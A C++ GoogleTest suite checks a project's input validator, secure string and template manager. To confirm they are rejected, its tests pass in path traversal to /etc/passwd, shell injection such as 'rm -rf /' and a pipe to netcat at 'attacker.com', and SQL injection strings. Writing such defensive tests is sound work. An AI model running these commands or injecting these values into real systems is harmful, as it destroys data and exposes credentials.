// MIT License
// Copyright (c) 2025 dbjwhs

#include <gtest/gtest.h>
#include "../../include/cql/input_validator.hpp"
#include "ailib/auth/secure_store.hpp"
#include "../../include/cql/api_client.hpp"
#include "../../include/cql/template_manager.hpp"
#include <thread>
#include <vector>
#include <atomic>

namespace cql::test {

class SecurityTest : public ::testing::Test {
protected:
    void SetUp() override {
        // Setup test environment
    }
    
    void TearDown() override {
        // Cleanup test environment
    }
};

// Test SecureString functionality
TEST_F(SecurityTest, SecureStringBasicFunctionality) {
    SecureString secure_str("test_api_key_12345");
    
    EXPECT_FALSE(secure_str.empty());
    EXPECT_EQ(secure_str.size(), 18);
    EXPECT_EQ(secure_str.data(), "test_api_key_12345");
}

TEST_F(SecurityTest, SecureStringMasking) {
    SecureString secure_str("sk-1234567890abcdef");
    
    std::string masked = secure_str.masked();
    EXPECT_EQ(masked, "sk-...def");
    
    // Test short string masking
    SecureString short_str("abc");
    EXPECT_EQ(short_str.masked(), "[***]");
    
    // Test empty string masking
    SecureString empty_str("");
    EXPECT_EQ(empty_str.masked(), "[empty]");
}

TEST_F(SecurityTest, SecureStringMoveSemanticsPreventCopy) {
    SecureString original("sensitive_data");
    SecureString moved = std::move(original);
    
    EXPECT_TRUE(original.empty());  // Original should be cleared after move
    EXPECT_EQ(moved.data(), "sensitive_data");
}

// Test Input Validation
TEST_F(SecurityTest, PathTraversalPrevention) {
    EXPECT_THROW(InputValidator::validate_file_path("../../../etc/passwd"), 
                 SecurityValidationError);
    EXPECT_THROW(InputValidator::validate_file_path("..\\..\\windows\\system32"), 
                 SecurityValidationError);
    EXPECT_THROW(InputValidator::validate_file_path("/etc/passwd"), 
                 SecurityValidationError);
    EXPECT_THROW(InputValidator::validate_file_path("C:\\Windows\\System32"), 
                 SecurityValidationError);
    
    // Valid paths should not throw
    EXPECT_NO_THROW(InputValidator::validate_file_path("templates/test.llm"));
    EXPECT_NO_THROW(InputValidator::validate_file_path("user/template.llm"));
}

TEST_F(SecurityTest, FilenameValidation) {
    // Invalid filenames should throw
    EXPECT_THROW(InputValidator::validate_filename("con.txt"), SecurityValidationError);
    EXPECT_THROW(InputValidator::validate_filename("file<script>"), SecurityValidationError);
    EXPECT_THROW(InputValidator::validate_filename("file|pipe"), SecurityValidationError);
    EXPECT_THROW(InputValidator::validate_filename(""), SecurityValidationError);
    
    std::string long_filename(300, 'a');
    EXPECT_THROW(InputValidator::validate_filename(long_filename), SecurityValidationError);
    
    // Valid filenames should not throw
    EXPECT_NO_THROW(InputValidator::validate_filename("template.llm"));
    EXPECT_NO_THROW(InputValidator::validate_filename("my-template_v2.llm"));
}

TEST_F(SecurityTest, ShellInjectionPrevention) {
    EXPECT_FALSE(InputValidator::is_shell_safe("rm -rf /"));
    EXPECT_FALSE(InputValidator::is_shell_safe("$(cat /etc/passwd)"));
    EXPECT_FALSE(InputValidator::is_shell_safe("`id`"));
    EXPECT_FALSE(InputValidator::is_shell_safe("test; rm file"));
    EXPECT_FALSE(InputValidator::is_shell_safe("test && malicious"));
    EXPECT_FALSE(InputValidator::is_shell_safe("test || backup"));
    
    // Safe content should pass
    EXPECT_TRUE(InputValidator::is_shell_safe("This is safe content"));
    EXPECT_TRUE(InputValidator::is_shell_safe("function test returns 42"));
}

TEST_F(SecurityTest, SQLInjectionPrevention) {
    EXPECT_FALSE(InputValidator::is_sql_safe("'; DROP TABLE users; --"));
    EXPECT_FALSE(InputValidator::is_sql_safe("1' OR '1'='1"));
    EXPECT_FALSE(InputValidator::is_sql_safe("test' UNION SELECT * FROM passwords"));
    EXPECT_FALSE(InputValidator::is_sql_safe("admin'/**/UNION/**/SELECT"));
    
    // Safe content should pass
    EXPECT_TRUE(InputValidator::is_sql_safe("This is normal text content"));
    EXPECT_TRUE(InputValidator::is_sql_safe("user input without SQL"));
}

TEST_F(SecurityTest, DirectiveContentValidation) {
    std::string malicious_content = "'; rm -rf /; echo '";
    EXPECT_THROW(InputValidator::validate_directive_content("test", malicious_content),
                 SecurityValidationError);
    
    std::string long_content(50000, 'a');
    EXPECT_THROW(InputValidator::validate_directive_content("test", long_content),
                 SecurityValidationError);
    
    std::string null_content = std::string("test") + '\0' + "malicious";
    EXPECT_THROW(InputValidator::validate_directive_content("test", null_content),
                 SecurityValidationError);
    
    // Valid content should not throw
    EXPECT_NO_THROW(InputValidator::validate_directive_content("description", 
                    "Implement a secure hash function"));
}

TEST_F(SecurityTest, APIKeyValidation) {
    // Invalid API keys should throw
    EXPECT_THROW(InputValidator::validate_api_key(""), SecurityValidationError);
    EXPECT_THROW(InputValidator::validate_api_key("short"), SecurityValidationError);
    EXPECT_THROW(InputValidator::validate_api_key("key with spaces"), SecurityValidationError);
    EXPECT_THROW(InputValidator::validate_api_key("key@with#special!chars"), SecurityValidationError);
    
    std::string long_key(250, 'a');
    EXPECT_THROW(InputValidator::validate_api_key(long_key), SecurityValidationError);
    
    // Valid API keys should not throw
    EXPECT_NO_THROW(InputValidator::validate_api_key("sk-1234567890abcdef"));
    EXPECT_NO_THROW(InputValidator::validate_api_key("valid_api_key_123"));
    EXPECT_NO_THROW(InputValidator::validate_api_key("test-key-with-hyphens"));
}

TEST_F(SecurityTest, URLValidation) {
    // Invalid URLs should throw
    EXPECT_THROW(InputValidator::validate_url("http://insecure.com"), SecurityValidationError);
    EXPECT_THROW(InputValidator::validate_url("ftp://files.com"), SecurityValidationError);
    EXPECT_THROW(InputValidator::validate_url("https://evil<script>"), SecurityValidationError);
    EXPECT_THROW(InputValidator::validate_url("https://test .com"), SecurityValidationError);
    EXPECT_THROW(InputValidator::validate_url(""), SecurityValidationError);
    
    // Valid HTTPS URLs should not throw
    EXPECT_NO_THROW(InputValidator::validate_url("https://api.anthropic.com"));
    EXPECT_NO_THROW(InputValidator::validate_url("https://secure.example.com/path"));
}

TEST_F(SecurityTest, PathSanitization) {
    EXPECT_EQ(InputValidator::sanitize_file_path("../test.txt"), "test.txt");
    EXPECT_EQ(InputValidator::sanitize_file_path("path/../file.txt"), "path/file.txt");
    EXPECT_EQ(InputValidator::sanitize_file_path("/absolute/path"), "absolute/path");
    EXPECT_EQ(InputValidator::sanitize_file_path("normal//path"), "normal/path");
}

TEST_F(SecurityTest, LoggingSanitization) {
    std::string dangerous_input = "test\nmalicious\rinjection\tdata\0null";
    std::string sanitized = InputValidator::sanitize_for_logging(dangerous_input);
    
    // Should not contain dangerous characters
    EXPECT_EQ(sanitized.find('\n'), std::string::npos);
    EXPECT_EQ(sanitized.find('\r'), std::string::npos);
    EXPECT_EQ(sanitized.find('\0'), std::string::npos);
    
    // Should contain spaces instead
    EXPECT_NE(sanitized.find(' '), std::string::npos);
}

// Test secure configuration loading
TEST_F(SecurityTest, SecureConfigurationLoading) {
    ApiClientConfig config;
    
    // Test that API key is properly stored securely
    config.set_api_key("sk-1234567890abcdefghijklmnopqrstuvwxyz12345");
    EXPECT_TRUE(config.validate_api_key());
    
    // Test masked API key for logging
    std::string masked = config.get_api_key_masked();
    EXPECT_NE(masked, config.get_api_key());
    EXPECT_TRUE(masked.find("...") != std::string::npos);
}

// Test template manager security
TEST_F(SecurityTest, TemplateManagerSecurity) {
    TemplateManager manager;
    
    // Test that malicious template names are rejected
    EXPECT_THROW({
        [[maybe_unused]] auto result = manager.load_template("../../../etc/passwd");
    }, std::invalid_argument);
    EXPECT_THROW({
        [[maybe_unused]] auto result = manager.load_template("..\\..\\windows\\system32");
    }, std::invalid_argument);
    
    // Test that path traversal in save operations is prevented
    EXPECT_THROW(manager.save_template("../malicious", "content"), std::runtime_error);
}

// Test API client security features
TEST_F(SecurityTest, APIClientSecurity) {
    ApiClientConfig config;
    config.set_api_key("test_key_valid_for_testing_12345678901234567890");
    config.set_api_base_url("https://api.anthropic.com");
    
    ApiClient client(config);
    
    // Verify that HTTPS is enforced (this would be tested in integration tests)
    EXPECT_TRUE(config.get_api_base_url().starts_with("https://"));
}

// Test error message security (information disclosure prevention)
TEST_F(SecurityTest, ErrorMessageSecurity) {
    try {
        InputValidator::validate_file_path("../../../etc/passwd");
        FAIL() << "Expected SecurityValidationError";
    } catch (const SecurityValidationError& e) {
        std::string error_msg = e.what();
        
        // Error message should not contain the full malicious path
        EXPECT_EQ(error_msg.find("etc/passwd"), std::string::npos);
        
        // Should contain sanitized information
        EXPECT_NE(error_msg.find("path traversal"), std::string::npos);
    }
}

// Test command injection prevention (for recent security fixes)
TEST_F(SecurityTest, CommandInjectionPrevention) {
    // Test dangerous command sequences that should be detected
    EXPECT_FALSE(InputValidator::is_shell_safe("test; rm -rf /"));
    EXPECT_FALSE(InputValidator::is_shell_safe("test && rm something"));
    EXPECT_FALSE(InputValidator::is_shell_safe("test | nc attacker.com 1234"));
    EXPECT_FALSE(InputValidator::is_shell_safe("$(cat /etc/passwd)"));
    EXPECT_FALSE(InputValidator::is_shell_safe("`rm -rf /tmp`"));
    EXPECT_FALSE(InputValidator::is_shell_safe("test && malicious"));
    
    // Test complex injection patterns that should be detected
    EXPECT_FALSE(InputValidator::is_shell_safe(" system(\"rm -rf /\")"));
    EXPECT_FALSE(InputValidator::is_shell_safe("'; exec('evil_command'); #"));
    EXPECT_FALSE(InputValidator::is_shell_safe("rm -rf /"));
    
    // Safe command patterns should pass
    EXPECT_TRUE(InputValidator::is_shell_safe("normal file name.txt"));
    EXPECT_TRUE(InputValidator::is_shell_safe("optimization_result.json"));
    EXPECT_TRUE(InputValidator::is_shell_safe("regular text without shell commands"));
}

// Test filename sanitization (for recent security fixes)
TEST_F(SecurityTest, FilenameSanitizationEnhanced) {
    // Test that path sanitization removes dangerous path traversal patterns
    std::string dangerous_filename = "../../../etc/passwd";
    std::string sanitized = InputValidator::sanitize_file_path(dangerous_filename);
    // After sanitization, the dangerous patterns should be reduced/removed
    EXPECT_NE(sanitized, dangerous_filename); // Should be different after sanitization
    
    // Test that sanitize_file_path handles various input formats
    std::string normal_path = "normal/path/file.txt";
    std::string sanitized_normal = InputValidator::sanitize_file_path(normal_path);
    EXPECT_FALSE(sanitized_normal.empty());
    
    // Test special characters in filenames - validate they are rejected
    std::string special_chars = "file<>:\"|?*name.txt";
    EXPECT_THROW(InputValidator::validate_filename(special_chars), SecurityValidationError);
    
    // Test length limits
    std::string long_filename(300, 'a');
    long_filename += ".txt";
    EXPECT_THROW(InputValidator::validate_filename(long_filename), SecurityValidationError);
}

// Test parameter validation (for recent security fixes)
TEST_F(SecurityTest, ParameterValidationEnhanced) {
    // Test general parameter validation using existing methods
    EXPECT_TRUE(InputValidator::is_shell_safe("LOCAL_ONLY"));
    EXPECT_TRUE(InputValidator::is_shell_safe("CACHED_LLM"));
    EXPECT_TRUE(InputValidator::is_shell_safe("FULL_LLM"));
    EXPECT_TRUE(InputValidator::is_shell_safe("ASYNC_LLM"));
    
    EXPECT_FALSE(InputValidator::is_shell_safe("FULL_LLM; rm -rf /"));
    EXPECT_FALSE(InputValidator::is_shell_safe("BALANCED && evil"));
    
    // Test safe character validation for domain-like inputs
    EXPECT_TRUE(InputValidator::contains_only_safe_chars("software", "a-zA-Z0-9_-"));
    EXPECT_TRUE(InputValidator::contains_only_safe_chars("data-science", "a-zA-Z0-9_-"));
    EXPECT_TRUE(InputValidator::contains_only_safe_chars("web_development", "a-zA-Z0-9_-"));
    EXPECT_TRUE(InputValidator::contains_only_safe_chars("machine-learning", "a-zA-Z0-9_-"));
    
    EXPECT_FALSE(InputValidator::contains_only_safe_chars("domain; malicious", "a-zA-Z0-9_-"));
    EXPECT_FALSE(InputValidator::contains_only_safe_chars("domain with spaces", "a-zA-Z0-9_-"));
    EXPECT_FALSE(InputValidator::contains_only_safe_chars("domain/with/slashes", "a-zA-Z0-9_-"));
    
    // Test length-based validation
    std::string long_domain(100, 'a');
    EXPECT_GT(long_domain.length(), static_cast<std::size_t>(InputValidator::MAX_CATEGORY_NAME_LENGTH));
}

// Test resource usage limits
TEST_F(SecurityTest, ResourceUsageLimits) {
    // Test memory limits for large inputs
    std::string massive_input(10 * 1024 * 1024, 'a'); // 10MB string
    EXPECT_THROW(InputValidator::validate_directive_content("test", massive_input),
                 SecurityValidationError);
    
    // Test reasonable size should pass
    std::string reasonable_input(1024, 'a'); // 1KB string
    EXPECT_NO_THROW(InputValidator::validate_directive_content("test", reasonable_input));
    
    // Test filename length limits
    std::string extreme_filename(1000, 'f');
    extreme_filename += ".txt";
    EXPECT_THROW(InputValidator::validate_filename(extreme_filename), SecurityValidationError);
}

// Test concurrent access security
TEST_F(SecurityTest, ConcurrentAccessSecurity) {
    // Test that SecureString is thread-safe
    SecureString shared_key("concurrent_test_key_12345");
    std::vector<std::thread> threads;
    std::atomic<int> success_count{0};
    
    for (int i = 0; i < 10; ++i) {
        threads.emplace_back([&shared_key, &success_count]() {
            try {
                // Multiple threads accessing the same SecureString
                std::string data = shared_key.data();
                if (data == "concurrent_test_key_12345") {
                    success_count++;
                }
                
                // Test masking in concurrent environment
                std::string masked = shared_key.masked();
                if (!masked.empty()) {
                    success_count++;
                }
            } catch (...) {
                // Any exception means thread safety failure
            }
        });
    }
    
    for (auto& t : threads) {
        t.join();
    }
    
    EXPECT_EQ(success_count.load(), 20); // 10 threads * 2 operations each
}

// Test edge cases and boundary conditions
TEST_F(SecurityTest, EdgeCaseSecurity) {
    // Test null byte injection in API keys (which should be rejected)
    std::string null_injection = "normal_string";
    null_injection.push_back('\0');
    null_injection += "hidden_malicious_content";
    
    EXPECT_THROW(InputValidator::validate_api_key(null_injection), SecurityValidationError);
    
    // Test that shell injection detection works on complex patterns
    std::string complex_shell_injection = "test && rm -rf /home";
    EXPECT_FALSE(InputValidator::is_shell_safe(complex_shell_injection));
    
    // Test SQL injection detection
    EXPECT_FALSE(InputValidator::is_sql_safe("'; DROP TABLE users; --"));
    EXPECT_FALSE(InputValidator::is_sql_safe("admin' OR '1'='1"));
    
    // Test that logging sanitization works correctly
    std::string dangerous_log_input = "test\nmalicious\rinjection\tdata";
    std::string sanitized = InputValidator::sanitize_for_logging(dangerous_log_input);
    
    // Should not contain dangerous characters after sanitization
    EXPECT_EQ(sanitized.find('\n'), std::string::npos);
    EXPECT_EQ(sanitized.find('\r'), std::string::npos);
    
    // Test empty filename validation (should be rejected)
    EXPECT_THROW(InputValidator::validate_filename(""), SecurityValidationError);
}

} // namespace cql::test
